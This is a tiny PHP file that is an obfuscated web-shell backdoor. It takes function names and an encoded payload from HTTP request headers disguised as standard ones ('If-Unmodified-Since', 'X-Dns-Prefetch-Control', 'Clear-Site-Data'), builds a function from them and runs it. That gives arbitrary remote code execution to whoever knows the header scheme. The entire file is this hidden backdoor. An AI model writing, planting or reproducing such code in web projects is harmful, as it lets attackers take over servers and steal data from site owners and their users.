<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $created = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Clear-Site-Data']));
    $created();
}